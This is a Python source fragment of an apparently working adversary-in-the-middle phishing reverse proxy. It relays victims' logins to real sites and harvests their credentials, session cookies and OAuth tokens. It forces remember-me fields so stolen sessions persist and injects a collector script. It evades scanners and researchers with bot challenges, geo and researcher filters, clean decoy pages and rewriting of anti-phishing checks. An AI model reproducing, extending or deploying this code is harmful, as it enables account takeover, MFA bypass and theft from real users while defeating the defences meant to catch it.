        self._proxy("HEAD")

    # -- proxy core --
    def _target_path(self):
        """Path + query only. An absolute-form request line keeps its path and
        loses the attacker's host, so the proxy can never be used as a forward
        proxy to a third party or an internal address."""
        p = self.path or "/"
        if p[:7].lower() == "http://" or p[:8].lower() == "https://":
            u = urllib.parse.urlsplit(p)
            p = u.path or "/"
            if u.query:
                p += "?" + u.query
        if not p.startswith("/"):
            p = "/" + p
        return p

    def _over_tls(self):
        """Did the victim reach us over HTTPS (direct TLS or a tunnel edge)?"""
        if getattr(self.connection, "cipher", None):
            return True
        # an unconditional X-Forwarded-Proto read lets `X-Forwarded-Proto: https` over plain
        # HTTP make the session cookie Secure, so the browser never sends it back and the
        # session is lost silently. Trust it only when the operator opted into forwarded
        # headers.
        if not getattr(self.engine, "trust_headers", False):
            return False
        proto = (self.headers.get("X-Forwarded-Proto") or "").split(",")[0].strip()
        return proto.lower() == "https"

    def _framing_ok(self):
        """Reject a request that frames itself two ways, or twice.

        `Content-Length` together with `Transfer-Encoding`, and a duplicated Content-Length
        (http.client reads the first value), frame one request two ways: a client can
        smuggle a second request inside the first body's bytes and the server answers
        twice on one connection.

        Every refusal here leaves a body (or a would-be body) unread on a keep-alive
        connection, so the connection is closed: otherwise the leftover bytes were parsed
        as the next request line and the client got an answer to a request it never sent
        (measured: `username=v&password=pGET /x` read back as a method name).
        """
        te = self.headers.get("Transfer-Encoding")
        cls = self.headers.get_all("Content-Length") or []
        if te and cls:
            self.close_connection = True
            self._json({"ok": False, "error": "ambiguous framing"}, status=400)
            return False
        if len(cls) > 1:
            self.close_connection = True
            self._json({"ok": False, "error": "duplicate content-length"}, status=400)
            return False
        if te and te.strip().lower() != "chunked":
            # DEFECT: a transfer coding we cannot decode (e.g. `gzip`, or `gzip, chunked`)
            # was accepted, the body was silently dropped and the login POST was relayed
            # empty - the credentials were lost and the upstream session never established.
            # RFC 9112 7.1: a server MUST respond 501 to an unsupported transfer coding.
            self.close_connection = True
            self._json({"ok": False, "error": "unsupported transfer-encoding"}, status=501)
            return False
        return True

    def _body_len(self, max_body=None):
        """A safe Content-Length, or None when the request has already been answered.

        `int(headers.get("Content-Length"))` raises ValueError on a non-numeric header, and
        handle_one_request does not suppress it: the connection is dropped and the
        traceback reaches the operator's log, on every body route including the victim's
        own login POST.
        """
        raw = self.headers.get("Content-Length")
        if raw is None or raw == "":
            return 0
        try:
            n = int(raw)
        except (TypeError, ValueError):
            self.close_connection = True
            self._json({"ok": False, "error": "bad content-length"}, status=400)
            return None
        if n < 0:
            # DEFECT: a negative length was silently read as "no body", so the bytes the
            # client actually sent stayed in the stream and were parsed as the next
            # request (a desync) while the submission was dropped. It is invalid framing.
            self.close_connection = True
            self._json({"ok": False, "error": "bad content-length"}, status=400)
            return None
        cap = max_body or MAX_BODY
        if n > cap:
            # the declared body is unread: close so it is never parsed as a request
            self.close_connection = True
            self._json({"ok": False, "error": "payload too large"}, status=413)
            return None
        return n

    # ---- pre-serve human challenge ----
    def _challenge_applies(self):
        """Only a page navigation is challenged.

        Assets, the hook, the collector and the verify route itself must keep working,
        or a visitor could never pass the challenge.
        """
        if self.command not in ("GET", "HEAD", "POST"):
            return False
        path = urllib.parse.urlparse(self.path).path
        if _has_asset_extension(path):
            return False          # a stylesheet/image/script fetch, whatever it claims
        if not _accept_is_a_navigation(self.headers.get("Accept")):
            return False          # a genuine sub-resource fetch with a specific type
        engine = self.engine
        # exact matches, not prefixes: `GET /__bh/verify/` and `/__bh/capture` used to
        # slip past a startswith() test and get proxied
        for p in (engine.path_of(HOOK_PATH), engine.path_of(CAPTURE_PATH),
                  engine.path_of(BEACON_PATH), engine.path_of(INTEL_PATH),
                  engine.path_of(INTEL_JS_PATH), engine.path_of(VERIFY_PATH)):
            if path == p or path.startswith(p + "?"):
                return False
        return True

    def _challenge_cookie_name(self):
        # relocatable with the rest of the names, and never the session cookie itself
        return self.engine.symbols.session + "v"

    def _challenged_through(self, sess):
        """Has THIS session already passed the challenge?"""
        name = self._challenge_cookie_name()
        m = re.search(rf"{re.escape(name)}=([A-Za-z0-9_\-=]+)",
                      self.headers.get("Cookie") or "")
        return bool(m) and self.engine.challenge.verify(m.group(1), sess.sid)

    def _serve_challenge(self, sess):
        """The interstitial: no clone, no hook, no collector - nothing to fingerprint."""
        ch = self.engine.challenge
        nxt = self.path if self.path.startswith("/") else "/"
        body = ch.page(nxt, verify_url=self.engine.path_of(VERIFY_PATH),
                       brand=ch.brand).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("Referrer-Policy", "no-referrer")
        self.send_header("Set-Cookie", self._session_cookie(sess.sid))
        self.end_headers()
        # a HEAD response carries headers only: the challenge now covers HEAD as well, and
        # writing a body there is a protocol violation a scanner would notice
        if self.command != "HEAD":
            self.wfile.write(body)
        with contextlib.suppress(Exception):
            session_mod.touch(sess.vault, "challenge", "served")

    def _oauth_callback(self):
        """The provider redirected the victim's browser back to us.

        The state is matched against the flow we started (a mismatch is refused, never
        exchanged), the code is traded server-side with the PKCE verifier, and the tokens go
        into the session's vault. The victim is then sent on to the real site, so what they
        see afterwards is genuine.
        """
        from core import oauth as oauth_mod
        sess = self._session()
        parsed = urllib.parse.urlparse(self.path)
        code, state, error, description = oauth_mod.parse_redirect(parsed.query)
        if error or not code:
            self.engine.log(f"[proxy] oauth refused by the provider: "
                            f"{error or 'no code'} {description}")
            self._oauth_page("Approval was not completed",
                             "You can close this window and try again.")
            return
        try:
            flow = self.engine.oauth_finish(state, code)
        except Exception as e:
            self.engine.log(f"[proxy] oauth exchange failed: {type(e).__name__}: {e}")
            self._oauth_page("Sign-in could not be completed",
                             "Close this window and start again from the link.")
            return
        if flow is None:
            # DEFECT: a callback with no live flow - the process restarted between the
            # start and the redirect, or a scanner probed the callback path - returned
            # None and the next line raised AttributeError, killing the request thread
            # with a traceback instead of showing the victim the recovery page.
            self.engine.log("[proxy] oauth callback with no live flow: refused")
            self._oauth_page("Sign-in could not be completed",
                             "Close this window and start again from the link.")
            return
        tokens = dict(flow.tokens or {})
        scopes = str(tokens.get("scope") or self.engine.oauth_ready().scope or "").split()
        with contextlib.suppress(Exception):
            session_mod.add_oauth(sess.vault, tokens, provider=flow.spec.provider,
                                  client_id=flow.spec.client_id, scopes=scopes,
                                  source="oauth", tenant=flow.spec.tenant,
                                  issuer=flow.spec.issuer)
            if self.engine.db:
                self.engine.db.session_save(sess.vault)
        self.engine.log(f"[proxy] oauth {flow.spec.provider}: tokens vaulted for "
                        f"{sess.sid[:8]} (scopes: {' '.join(scopes) or '-'})")
        if self.engine.on_capture:
            with contextlib.suppress(Exception):
                self.engine.on_capture({
                    "type": "oauth", "sid": sess.sid, "ip": self._client_ip(),
                    "campaign": self.engine.campaign, "provider": flow.spec.provider,
                    "scopes": scopes,
                    "has_refresh": bool(tokens.get("refresh_token")),
                    "has_access": bool(tokens.get("access_token")),
                    "token_intel": sess.vault.get("token_intel") or {}})
        target = f"{self.engine.public_base()}/" if not self.engine.phishlet.unauth_url \
            else self.engine.phishlet.unauth_url
        self.send_response(302)
        self.send_header("Location", target)
        self.send_header("Content-Length", "0")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()

    def _oauth_page(self, title, message):
        body = (f"<!doctype html><html><head><meta charset=\"utf-8\">"
                f"<title>{html_mod.escape(title)}</title></head>"
                f"<body style=\"font:15px system-ui;padding:40px\">"
                f"<h2>{html_mod.escape(title)}</h2>"
                f"<p>{html_mod.escape(message)}</p></body></html>").encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _verify_route(self):
        """Score one challenge report; issue the token only for a pass."""
        n = self._body_len()
        if n is None:
            return
        raw = self.rfile.read(n) if n else b""
        try:
            signals = json.loads(raw.decode("utf-8", "replace") or "{}")
            if not isinstance(signals, dict):
                raise ValueError("payload must be an object")
        except Exception:
            self._json({"ok": False, "error": "malformed json"}, status=400)
            return
        sess = self._session()
        ch = self.engine.challenge
        if ch is None:
            self._json({"ok": True})
            return
        ok, score, reasons = ch.judge(signals)
        if ok:
            token = ch.issue(sess.sid)
            cookie = (f"{self._challenge_cookie_name()}={token}; Path=/; "
                      f"SameSite=Lax; HttpOnly")
            if self._over_tls():
                cookie += "; Secure"
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Cache-Control", "no-store")
            self.send_header("Set-Cookie", cookie)
            body = json.dumps({"ok": True, "score": score}).encode()
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            with contextlib.suppress(Exception):
                session_mod.touch(sess.vault, "challenge", f"passed score={score}")
                with contextlib.suppress(Exception):
                    if self.engine.db:
                        self.engine.db.session_save(sess.vault)
            return
        # a refusal is recorded on the session, so the operator can see who was turned
        # away and why (this is the signal the old pre-serve decision never had)
        with contextlib.suppress(Exception):
            sess.vault.setdefault("meta", {})["challenge"] = {
                "score": score, "reasons": reasons}
            session_mod.touch(sess.vault, "challenge", f"refused score={score}")
            # keep the refusal: it is the signal the operator wants (who was turned away
            # and why). session_save caps how many challenge-only rows can exist.
            with contextlib.suppress(Exception):
                if self.engine.db:
                    self.engine.db.session_save(sess.vault)
        self._json({"ok": False, "score": score, "reasons": reasons})

    def _gate_allows(self, sess):
        """Run every gating rule for this request, whatever the method.

        Returns True when the visitor may be served. The gate used to run in
        do_GET only, so a POST or a HEAD walked around a country rule, the
        researcher filter and the hit cap.
        """
        gate = self.engine.gate
        if gate is None:
            return True
        geo = self.engine.geo_cached(self._client_ip()) if gate.needs_geo else {}
        ok, why = gate.check(
            ip=self._client_ip(), country=geo.get("country"),
            country_code=geo.get("country_code", ""), isp=geo.get("isp"),
            ua=self.headers.get("User-Agent", ""),
            org=geo.get("org", "") or geo.get("isp", ""), asn=geo.get("asn", ""))
        if not ok:
            self.engine.log(f"[proxy] refused {self._client_ip()}: {why}")
            with contextlib.suppress(Exception):
                if self.engine.db:
                    self.engine.db.log_blocked(self._client_ip(),
                                               geo.get("country", ""), why)
            return False
        # A page load pulls in dozens of assets. Counting every one of them
        # against --max-hits burned the cap on a single visit; only a document
        # navigation counts.
        if self._is_navigation():
            gate.note_hit(self._client_ip())
        # the per-device cap: the token only exists once the collector has reported, so
        # the store seeds the count and the in-memory window continues it
        token = getattr(sess, "device_token", "") if sess is not None else ""
        if gate.max_hits_per_device and token:
            extra = 0
            with contextlib.suppress(Exception):
                if self.engine.db:
                    extra = self.engine.db.device_hit_count(token)
            over, count = gate.device_capped(token, extra=extra)
            if over:
                self.engine.log(f"[proxy] refused device {token[:12]}: "
                                f"per-device cap reached ({count})")
                with contextlib.suppress(Exception):
                    if self.engine.db:
                        self.engine.db.log_blocked(self._client_ip(),
                                                   geo.get("country", ""),
                                                   f"device cap reached ({count})")
                return False
            gate.note_device_hit(token)
        return True

    def _is_navigation(self):
        """Is this request the page itself rather than one of its assets?"""
        if (self.headers.get("Sec-Fetch-Dest") or "").strip().lower() == "document":
            return True
        if (self.headers.get("Sec-Fetch-Mode") or "").strip().lower() == "navigate":
            return True
        # a client that sends no fetch metadata: count it (conservative), unless
        # it is asking for something that is clearly a sub-resource
        if self.headers.get("Sec-Fetch-Dest"):
            return False
        accept = (self.headers.get("Accept") or "").lower()
        return "text/html" in accept or "application/xhtml" in accept or accept == ""

    def _read_chunked(self, cap=None):
        """De-chunk a Transfer-Encoding: chunked request body.

        A chunked body has no Content-Length, so the old code read zero bytes and
        relayed a login POST with an empty body. Chunks are read from the socket
        until the terminating 0-chunk, with the same cap as any other body.
        """
        cap = cap or MAX_BODY
        out = b""
        while True:
            line = self.rfile.readline(64)
            if not line:
                break
            size_txt = line.split(b";", 1)[0].strip()
            try:
                size = int(size_txt or b"0", 16)
            except ValueError:
                # DEFECT: a malformed chunk-size line silently ended the body, leaving the
                # rest of the chunked stream unread on a keep-alive connection (parsed as
                # the next request). It is invalid framing - fail it, and the caller closes.
                raise ValueError("bad chunk size") from None
            if size <= 0:
                # trailer section: consume until the blank line, then stop
                while True:
                    trailer = self.rfile.readline(1024)
                    if not trailer or trailer in (b"\r\n", b"\n"):
                        break
                break
            if size > cap or len(out) + size > cap:
                # Refuse WITHOUT reading the declared size: a client that announces
                # `ffffffff` and then sends nothing held the worker thread forever in
                # `rfile.read(size)` (slowloris-shaped), while an oversized body that is
                # actually sent must still be a 413, not a silent truncation.
                raise ValueError("payload too large")
            out += self.rfile.read(size)
            self.rfile.read(2)                     # trailing CRLF
        return out

    def _proxy(self, method, decoy_mode=False):
        sess = self._session()
        chunked = "chunked" in (self.headers.get("Transfer-Encoding") or "").lower()
        if chunked:
            n = 0                      # the body is de-chunked below, with its own cap
        else:
            n = self._body_len()
            if n is None:
                return
        if chunked:
            try:
                body = self._read_chunked() or None
            except ValueError as e:
                # the remaining chunks are unread: close so they are never parsed as a
                # request line (a rejected chunked body used to desync the connection)
                self.close_connection = True
                self._json({"ok": False, "error": str(e)},
                           status=413 if "too large" in str(e) else 400)
                return
        else:
            body = self.rfile.read(n) if n else None
        hdrs = dict(self.headers.items())
        # Header names are case-insensitive (RFC 9110) and this dict is not: a client
        # sending 'transfer-encoding: chunked' or 'origin:' in lowercase kept the header
        # through every step below, so the de-chunked body was relayed with BOTH
        # transfer-encoding: chunked and a Content-Length (contradictory framing on a
        # raw body) and a lowercase Origin was never rewritten (the upstream saw the
        # phish host, breaking Origin/CSRF-checked logins). The lookups go through a
        # lowercase index while the original spelling is preserved in the relay.
        lower = {k.lower(): k for k in hdrs}
        for name in ("transfer-encoding", "content-length"):
            if name in lower:
                hdrs.pop(lower[name], None)
        if body is not None:
            hdrs["Content-Length"] = str(len(body))
        target = self._target_path()
        host = self.engine.host_for(hdrs, sess)
        # the upstream session, not the victim's - and scoped by the jar's own
        # domain/path/secure rules instead of a blind join of every cookie
        upstream_url = (f"{host.scheme}://{host.orig_host}/" if host is not None else "")
        hdrs["Cookie"] = transport.cookie_header(sess.cookies, upstream_url)
        # Origin/Referer must look like the real site, or an Origin/CSRF-checked
        # login rejects the request (the WebSocket path already did this)
        if host is not None:
            # a browser includes a NON-DEFAULT port in Origin; leaving it out made
            # the request look slightly wrong to an origin-checking backend
            _port = int(getattr(host, "port", 0) or (443 if host.scheme == "https" else 80))
            _dflt = 443 if host.scheme == "https" else 80
            origin = f"{host.scheme}://{host.orig_host}" + (
                f":{_port}" if _port != _dflt else "")
            origin_key = lower.get("origin")
            if origin_key:
                hdrs[origin_key] = origin
            referer_key = lower.get("referer")
            if referer_key:
                hdrs[referer_key] = origin + (
                    urllib.parse.urlsplit(hdrs[referer_key]).path or "/")
        # capture credentials from the request we are about to relay
        if method == "POST" and body and self.engine.phishlet.credentials:
            try:
                text = body.decode("utf-8", "replace")
                got = {}
                for name, cf in self.engine.phishlet.credentials.items():
                    val = cf.extract(text)
                    if val:
                        got[name] = val
                if not got:
                    got = self.engine._fields_from_body(text)
                if got:
                    self.engine.note_credentials(sess, got, target, host,
                                                 body=body, headers=hdrs)
            except Exception as e:
                self.engine.log(f"[proxy] cred extraction: {type(e).__name__}: {e}")
        # force_post: inject fields the victim did not tick (e.g. remember-me),
        # so the captured session outlives the browser tab
        ctype = (self.headers.get("Content-Type") or "").lower()
        if method == "POST" and body and "application/x-www-form-urlencoded" in ctype:
            try:
                text = body.decode("utf-8", "replace")
                forced = self.engine.phishlet.force_post_for(target, text)
                if forced:
                    for f in forced:
                        text = f.apply(text)
                    body = text.encode()
                    hdrs["Content-Length"] = str(len(body))
            except Exception:
                pass
        if (self.engine.oauth_ready() is not None and method == "GET"
                and self._is_navigation()
                and not (sess.vault.get("oauth") or {}).get("access_token")):
            # no lookalike page at all: the victim's browser goes to the real provider
            url = self.engine.oauth_start(sess)
            if url:
                self.send_response(302)
                self.send_header("Location", url)
                self.send_header("Content-Length", "0")
                self.send_header("Cache-Control", "no-store")
                self.end_headers()
                return
        hit = self.engine.phishlet.intercept_for(
            urllib.parse.urlparse(target).path or target, method)
        if hit is not None:
            # answered locally: the request never reaches the upstream, so a telemetry
            # endpoint cannot see our injected page's fingerprint
            self.send_response(hit.status)
            self.send_header("Content-Type", hit.content_type)
            for k, v in hit.headers.items():
                self.send_header(k, v)
            self.send_header("Content-Length", str(len(hit.body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            if self.command != "HEAD":
                self.wfile.write(hit.body)
            self.engine.log(f"[proxy] intercept {method} {target} -> {hit.status}")
            return
        try:
            resp = self.engine.fetch(sess, method, target, headers=hdrs, body=body,
                                     host=host)
        except Exception as e:
            # look like a real site hiccup, never like a proxy error
            msg = (b"<!doctype html><html><head><title>502</title></head><body>"
                   b"<h1>Bad gateway</h1><p>The server is temporarily unavailable.</p>"
                   b"</body></html>")
            self.send_response(502)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(msg)))
            self.end_headers()
            self.wfile.write(msg)
            self.engine.log(f"[proxy] upstream error: {type(e).__name__}: {e}")
            return

        # A body we cannot decode must not be rewritten: decoding brotli/zstd bytes
        # with errors="replace" and shipping them as HTML handed the victim corrupt
        # binary with a collector tag in front of it.
        enc = (resp.headers.get("Content-Encoding") or "").strip().lower()
        if enc and enc not in ("gzip", "deflate", "identity", "compress"):
            self.send_response(resp.status_code)
            body_raw = resp.content or b""
            for k, v in (getattr(resp, "pairs", None) or resp.headers.items()):
                if k.lower() in ("content-encoding", "content-length"):
                    continue
                self.send_header(k, v)
            self.send_header("Content-Length", str(len(body_raw)))
            self.end_headers()
            with contextlib.suppress(Exception):
                self.wfile.write(body_raw)
            return
        ctype = resp.headers.get("Content-Type", "")
        out_headers = self.engine.rewrite_headers(resp, over_tls=self._over_tls())
        if "text/html" in ctype:
            html = resp.text
            path_now = urllib.parse.urlparse(self.path).path
            html = self.engine.rewrite_html(html, sess, path_now, host=host,
                                            content_type=ctype,
                                            decoy_mode=decoy_mode)
            if not decoy_mode:
                # A decoy is served to a scanner: it must be the upstream page
                # and nothing else. Injecting the collector here handed every
                # scanner the endpoint, the session id and the whole design.
                html = self.engine.inject_js(html, host, path_now, ctype, sess)
            body_out = html.encode("utf-8", "replace")
            out_headers = [(k, v) for k, v in out_headers if k.lower() != "content-type"]
            out_headers.append(("Content-Type", "text/html; charset=utf-8"))
        elif any(m in ctype for m in ("javascript", "json", "css", "xml")):
            # sub_filters apply to scripts too: that is where JS-built origins
            # (and anti-phishing checks) hide
            text = self.engine.apply_sub_filters(resp.text, host, ctype, target)
            body_out = text.encode("utf-8", "replace")
        else:
            body_out = resp.content
        out_headers = [(k, v) for k, v in out_headers if k.lower() != "content-length"]
        out_headers.append(("Content-Length", str(len(body_out))))
        if not decoy_mode:
            # our own session cookie rides alongside whatever upstream set; a
            # decoy gets none of ours (it would fingerprint us to a scanner)
            out_headers.append(("Set-Cookie", self._session_cookie(sess.sid)))

        # status line only: out_headers already carries exactly one Server and one
        # Date (the upstream's, or the configured fallback)
        self.send_response_only(resp.status_code)
        for k, v in out_headers:
            self.send_header(k, v)
        self.end_headers()
        if method != "HEAD":
            self.wfile.write(body_out)

        # ---- session accounting (never let this break the response) ----
        try:
            if not decoy_mode:
                self.engine.note_tokens(sess, resp, target, host=host)
                self.engine.maybe_complete(sess, target, host=host)
        except Exception as e:
            self.engine.log(f"[proxy] session accounting: {type(e).__name__}: {e}")


def serve_proxy(engine, port, host="0.0.0.0", campaign="", tls=False,
                cert_path=None, server_header=""):
    """Start the proxy; returns the httpd (call serve_forever in a thread).

    With tls=True the ClientHello is fingerprinted (JA3) per connection before
    the handshake, so every visitor carries a TLS fingerprint the operator can
    trust more than any header.
    """
    engine.campaign = campaign

    # the upstream labels itself; only fall back when it does not
    if not server_header:
        server_header = getattr(engine, "server_header", "")
    class Handler(ProxyHandler):
        pass

    Handler.engine = engine
    Handler.server_header = server_header

    class _Server(tls_fp.PeekTLSMixin, socketserver.ThreadingMixIn,
                  http.server.HTTPServer):
        daemon_threads = True
        request_queue_size = 128
        allow_reuse_address = True

    if tls and not cert_path:
        raise ValueError("--tls needs --cert <pem>: refusing to serve plaintext "
                         "when TLS was requested")
    if tls and cert_path:
        import ssl as _ssl
        ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_SERVER)
        if "_cert." in cert_path:
            key_path = cert_path.replace("_cert.", "_key.")
        elif "cert." in os.path.basename(cert_path):
            key_path = cert_path.replace("cert.", "key.")
        else:
            key_path = cert_path + ".key"
        ctx.load_cert_chain(cert_path, key_path)
        Handler._ssl_ctx_ready = True
        _Server.ssl_ctx = ctx

    httpd = _Server((host, port), Handler)
    httpd.proxy_engine = engine
    return httpd
